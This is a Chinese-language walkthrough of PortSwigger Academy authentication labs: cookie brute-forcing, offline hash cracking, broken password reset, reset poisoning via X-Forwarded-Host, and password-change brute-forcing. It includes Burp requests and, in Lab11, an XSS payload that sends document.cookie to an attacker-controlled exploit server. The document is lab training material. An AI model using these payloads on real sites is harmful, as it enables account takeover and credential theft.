重置密码的一种更可靠的方法是向用户发送唯一的URL，该URL将用户带到密码重置页。此方法的安全性较低的实现使用带有易于猜测的参数的URL来标识正在重置的帐户，例如：
http://vulnerable-website.com/reset-password?user=victim-user
 
在此示例中，攻击者可以更改user参数以引用他们识别的任何用户名。然后，他们将被直接带到一个页面，在那里他们可以为这个任意用户设置一个新密码。
 
此过程的一个更好的实现是生成一个高熵、难以猜测的令牌，并基于该令牌创建重置URL。在最佳情况下，此URL不应提供有关正在重置哪个用户密码的提示。 
http://vulnerable-website.com/reset-password?token=a0ba0d1cb3b63d13822572fcff1a241895d893f659164d4cc550b421ebdd48a8
 
当用户访问此URL时，系统应该检查后端是否存在此令牌，如果存在，应该重置哪个用户的密码。此令牌应在短时间后过期，并在重置密码后立即销毁。
 
但是，某些网站在提交重置表单时也无法再次验证令牌。在这种情况下，攻击者只需通过自己的帐户访问重置表单，删除令牌，然后利用此页面重置任意用户的密码。 
 
如果重置电子邮件中的URL是动态生成的，也可能容易受到密码重置毒害。在这种情况下，攻击者可能会窃取其他用户的令牌并使用它更改其密码。
3、更改用户密码

通常，更改密码需要输入当前密码，然后输入新密码两次。这些页面基本上依赖于与普通登录页面相同的过程来检查用户名和当前密码是否匹配。因此，这些页可能容易受到相同技术的攻击。
 
如果密码更改功能允许攻击者在不以受害用户身份登录的情况下直接访问它，则该功能可能特别危险。例如，如果用户名在隐藏字段中提供，攻击者就可能在请求中编辑此值以攻击任意用户。攻击者可能会利用此漏洞枚举用户名和强力密码。 

```

## Lab10

### 前置

#### Vulnerabilities in other authentication mechanisms

In this section, we'll look at some of the supplementary functionality that is related to authentication and demonstrate how these can be vulnerable. We've also created several interactive labs that you can use to put what you've learned into practice.

In addition to the basic login functionality, most websites provide supplementary functionality to allow users to manage their account. For example, users can typically change their password or reset their password when they forget it. These mechanisms can also introduce vulnerabilities that can be exploited by an attacker.

Websites usually take care to avoid well-known vulnerabilities in their login pages. But it is easy to overlook the fact that you need to take similar steps to ensure that related functionality is equally as robust. This is especially important in cases where an attacker is able to create their own account and, consequently, has easy access to study these additional pages.

##### Keeping users logged in

A common feature is the option to stay logged in even after closing a browser session. This is usually a simple checkbox labeled something like "Remember me" or "Keep me logged in".

This functionality is often implemented by generating a "remember me" token of some kind, which is then stored in a persistent cookie. As possessing this cookie effectively allows you to bypass the entire login process, it is best practice for this cookie to be impractical to guess. However, some websites generate this cookie based on a predictable concatenation of static values, such as the username and a timestamp. Some even use the password as part of the cookie. This approach is particularly dangerous if an attacker is able to create their own account because they can study their own cookie and potentially deduce how it is generated. Once they work out the formula, they can try to brute-force other users' cookies to gain access to their accounts.

Some websites assume that if the cookie is encrypted in some way it will not be guessable even if it does use static values. While this may be true if done correctly, naively "encrypting" the cookie using a simple two-way encoding like Base64 offers no protection whatsoever. Even using proper encryption with a one-way hash function is not completely bulletproof. If the attacker is able to easily identify the hashing algorithm, and no salt is used, they can potentially brute-force the cookie by simply hashing their wordlists. This method can be used to bypass login attempt limits if a similar limit isn't applied to cookie guesses.

### 题目

```
Lab: Brute-forcing a stay-logged-in cookie
PRACTITIONER

This lab allows users to stay logged in even after they close their browser session. The cookie used to provide this functionality is vulnerable to brute-forcing.

To solve the lab, brute-force Carlos's cookie to gain access to his "My account" page.

Your credentials: wiener:peter
Victim's username: carlos
```

### 答案

这个题目思路很简单，当受害者登录时选择了类似 `记住我` 的选择（即下次不需要输入账号密码登录），会把 Cookie 存在客户端，假如这个特定的 Cookie 字段的信息有特殊含义且我们知道加密方式，便可尝试爆破或者绕过

使用 wiener 账号测试，点击 `保持登录` 并抓包

```http
GET /my-account?id=wiener HTTP/2
Host: 0a07009104b85b0b81c9023a001e00d4.web-security-academy.net
Cookie: stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw; session=1KUF0duWtpwATL2dSPRr6k45wtiSBXgW
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Referer: https://0a07009104b85b0b81c9023a001e00d4.web-security-academy.net/login
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
```

一眼看到 Cookie 里的 `stay-logged-in` 字段可能是 base64 编码的，解码后为：

```
wiener:51dc30ddc473d43a6011e9ebba6ca770
```

对密码则是一眼用了 MD5 加密，解密得

```
peter
```

接下来用 bp 处理 爆破参数来爆破即可，爆破前记得浏览器把 wiener 用户给退出来

<img src=".\图片\Snipaste_2023-08-04_16-55-09.png" alt="Snipaste_2023-08-04_16-55-09" style="zoom:80%;" />

得到返回数据包

```http
GET /my-account?id=carlos HTTP/2
Host: 0a07009104b85b0b81c9023a001e00d4.web-security-academy.net
Cookie: stay-logged-in=§d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw§; session=1KUF0duWtpwATL2dSPRr6k45wtiSBXgW
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Referer: https://0a07009104b85b0b81c9023a001e00d4.web-security-academy.net/login
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
```

正确登录

## Lab11

### 前置

Even if the attacker is not able to create their own account, they may still be able to exploit this vulnerability. Using the usual techniques, such as [XSS](https://portswigger.net/web-security/cross-site-scripting), an attacker could steal another user's "remember me" cookie and deduce how the cookie is constructed from that. If the website was built using an open-source framework, the key details of the cookie construction may even be publicly documented.

In some rare cases, it may be possible to obtain a user's actual password in cleartext from a cookie, even if it is hashed. Hashed versions of well-known password lists are available online, so if the user's password appears in one of these lists, decrypting the hash can occasionally be as trivial as just pasting the hash into a search engine. This demonstrates the importance of salt in effective encryption.

### 题目

```
Lab: Offline password cracking
PRACTITIONER

This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos's stay-logged-in cookie and use it to crack his password. Then, log in as carlos and delete his account from the "My account" page.

Your credentials: wiener:peter
Victim's username: carlos
```

### 答案

先 xss 获得 cookie，再离线解密 ，再登录即可。前提还是 Cookie 里的字段是有特殊含义的加密，而不是随机无意义的字符。

XSS 获取 Cookie

这是漏洞利用服务器（类似蓝莲花的XSS平台）

```
<script>document.location='//exploit-0a2e0030042f26c785a0b0b2013d0014.exploit-server.net/'+document.cookie</script>
```

把它插到一个文章的评论区

随即在漏洞利用服务器上看到

```http
10.0.4.38       2023-08-04 09:10:12 +0000 "GET /secret=WWHbtV1tyUM9n2Sy68Pe2d3fVDnD9PRX;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
```

得到 `stay-logged-in` 字段

```
Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
```

逐步base64 和 MD5 解密后 得到

```
carlos:26323c16d5f4dabff3bb136f2460a943
carlos:onceuponatime
```

登录即可操作删除账号的操作

<img src=".\图片\Snipaste_2023-08-04_17-14-20.png" alt="Snipaste_2023-08-04_17-14-20" style="zoom:80%;" />

## Lab12

### 前置

#### Resetting user passwords

In practice, it is a given that some users will forget their password, so it is common to have a way for them to reset it. As the usual password-based authentication is obviously impossible in this scenario, websites have to rely on alternative methods to make sure that the real user is resetting their own password. For this reason, the password reset functionality is inherently dangerous and needs to be implemented securely.

There are a few different ways that this feature is commonly implemented, with varying degrees of vulnerability.

##### Sending passwords by email

It should go without saying that sending users their current password should never be possible if a website handles passwords securely in the first place. Instead, some websites generate a new password and send this to the user via email.

Generally speaking, sending persistent passwords over insecure channels is to be avoided. In this case, the security relies on either the generated password expiring after a very short period, or the user changing their password again immediately. Otherwise, this approach is highly susceptible to man-in-the-middle attacks.

Email is also generally not considered secure given that inboxes are both persistent and not really designed for secure storage of confidential information. Many users also automatically sync their inbox between multiple devices across insecure channels.

##### Resetting passwords using a URL

A more robust method of resetting passwords is to send a unique URL to users that takes them to a password reset page. Less secure implementations of this method use a URL with an easily guessable parameter to identify which account is being reset, for example:

```
http://vulnerable-website.com/reset-password?user=victim-user
```

In this example, an attacker could change the `user` parameter to refer to any username they have identified. They would then be taken straight to a page where they can potentially set a new password for this arbitrary user.

A better implementation of this process is to generate a high-entropy, hard-to-guess token and create the reset URL based on that. In the best case scenario, this URL should provide no hints about which user's password is being reset.

```
http://vulnerable-website.com/reset-password?token=a0ba0d1cb3b63d13822572fcff1a241895d893f659164d4cc550b421ebdd48a8
```

When the user visits this URL, the system should check whether this token exists on the back-end and, if so, which user's password it is supposed to reset. This token should expire after a short period of time and be destroyed immediately after the password has been reset.

However, some websites fail to also validate the token again when the reset form is submitted. In this case, an attacker could simply visit the reset form from their own account, delete the token, and leverage this page to reset an arbitrary user's password.

### 题目

```
Lab: Password reset broken logic
APPRENTICE

This lab's password reset functionality is vulnerable. To solve the lab, reset Carlos's password then log in and access his "My account" page.

Your credentials: wiener:peter
Victim's username: carlos
```

### 答案

这个很好理解，先登录成功，再经历一些验证，再抓到重置密码的数据包，观察这个数据包中关于用户身份的信息，尝试把其修改为其它用户，便可能修改其它用户的密码信息

先走流程，wiener 账号密码登录，看到我们自己的邮箱

```
wiener@exploit-0ab000b70423b5278a7d7759014600e4.exploit-server.net
```

再退出登录，选择 **忘记密码** 的功能，验证时输入 wiener 的邮箱，再到邮件服务器查看 wiener 的邮件信息

得到一个更换密码的 url

```http
https://0aa500280415b54e8aa478bb00a6004b.web-security-academy.net/forgot-password?temp-forgot-password-token=LinEeyuxnnVuGy9Q20sNwinTdG9Ye5Z6
```

<img src=".\图片\Snipaste_2023-08-04_17-32-47.png" alt="Snipaste_2023-08-04_17-32-47" style="zoom:80%;" />

再拦截抓包

```http
POST /forgot-password?temp-forgot-password-token=LinEeyuxnnVuGy9Q20sNwinTdG9Ye5Z6 HTTP/2
Host: 0aa500280415b54e8aa478bb00a6004b.web-security-academy.net
Cookie: session=7BPEm75rttJ9nKmSmyeOlXncDMWR3NBQ
Content-Length: 119
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0aa500280415b54e8aa478bb00a6004b.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aa500280415b54e8aa478bb00a6004b.web-security-academy.net/forgot-password?temp-forgot-password-token=LinEeyuxnnVuGy9Q20sNwinTdG9Ye5Z6
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

temp-forgot-password-token=LinEeyuxnnVuGy9Q20sNwinTdG9Ye5Z6&username=wiener&new-password-1=123456&new-password-2=123456
```

很明显，我们把 post 数据里的 username 字段换成 carlos 试试

于是 carlos 的密码成功被我们修改为 123456

## Lab13

### 前置

If the URL in the reset email is generated dynamically, this may also be vulnerable to password reset poisoning. In this case, an attacker can potentially steal another user's token and use it change their password.

### 题目

```
Lab: Password reset poisoning via middleware
PRACTITIONER

This lab is vulnerable to password reset poisoning. The user carlos will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's account. You can log in to your own account using the following credentials: wiener:peter. Any emails sent to this account can be read via the email client on the exploit server.
```

本实验中X-Forwarded-Host标头是受支持的，使用它来将动态生成的重置链接指向自己控制的任意域

### 答案

这题与上题的不同，就是修改密码参数中 `temp-forgot-password-token` 是动态的，使用 wiener 用户的 token 无法修改 carlos 用户的密码。但是，这题有另外一个漏洞，就是支持 `X-Forwarded-Host` ，可以使用它来将动态生成的重置链接指向自己控制的任意域，即把carlos 的 token 发送到我们自己的漏洞利用服务器

 还是先登录到 wiener 账号得到邮箱

```
wiener@exploit-0a520010041aea808403442501c30022.exploit-server.net
```

再退出登录，使用受害者 carlos 的账号获取它重置密码的那个动态token，使用覆盖 url 把carlos 的 token 发送到我们自己的漏洞利用服务器

<img src=".\图片\Snipaste_2023-08-04_17-51-23.png" alt="Snipaste_2023-08-04_17-51-23" style="zoom:80%;" />

抓包加上我们漏洞服务器的地址

```
X-Forwarded-Host: exploit-0a520010041aea808403442501c30022.exploit-server.net
```

得到重置 carlos 账号密码的 token

<img src=".\图片\Snipaste_2023-08-04_17-54-15.png" alt="Snipaste_2023-08-04_17-54-15" style="zoom:67%;" />

```
10.0.4.234      2023-08-04 09:53:22 +0000 "GET /forgot-password?temp-forgot-password-token=6JtAICarGzfnx2Dt3xhoqGFKnrSIGv4I HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
```

```
6JtAICarGzfnx2Dt3xhoqGFKnrSIGv4I
```

接着登录 wiener 账号重置密码，从邮箱得到重置密码的链接，把其中的 token 换为 carlos 的 token

<img src=".\图片\Snipaste_2023-08-04_17-58-04.png" alt="Snipaste_2023-08-04_17-58-04" style="zoom:80%;" />

于是 carlos:123456 登录成功

## Lab14

### 前置

#### Changing user passwords

Typically, changing your password involves entering your current password and then the new password twice. These pages fundamentally rely on the same process for checking that usernames and current passwords match as a normal login page does. Therefore, these pages can be vulnerable to the same techniques.

Password change functionality can be particularly dangerous if it allows an attacker to access it directly without being logged in as the victim user. For example, if the username is provided in a hidden field, an attacker might be able to edit this value in the request to target arbitrary users. This can potentially be exploited to enumerate usernames and brute-force passwords.

### 题目

```
Lab: Password brute-force via password change
PRACTITIONER

This lab's password change functionality makes it vulnerable to brute-force attacks. To solve the lab, use the list of candidate passwords to brute-force Carlos's account and access his "My account" page.

Your credentials: wiener:peter
Victim's username: carlos
Candidate passwords
```

### 答案

先用已知账户 wiener 对重置密码流程有些了解

登录后显示修改密码的页面，需要输入原密码，需要重复确认输入新密码，非常贴合实际

#### 思路

从修改密码的返回信息中探测出端倪

- 方法1：正确原始密码、不一致的新密码（可爆破出原密码）

​       爆破中：原密码错误时候提示Current password is incorrect，原密码正确的时候提示New passwords do not match

- 方法2：错误原密码、不一致新密码

  爆破中：当原密码错误时候，提示Current password is incorrect；当原密码正确到时候，提示信息变为New passwords do not match

- 方法3：错误原密码、一致新密码

  错误出现302跳转到登陆页面，正确也是302跳转（无法爆破）

#### 步骤

登录 wiener 用户 抓到修改密码的数据包

把 username 从 wiener 改为 carlos，再输入不一致的新密码，对原密码进行爆破

<img src=".\图片\Snipaste_2023-08-04_18-22-22.png" alt="Snipaste_2023-08-04_18-22-22" style="zoom:80%;" />

找到受害者 carlos 用户的原密码为

```
matrix
```


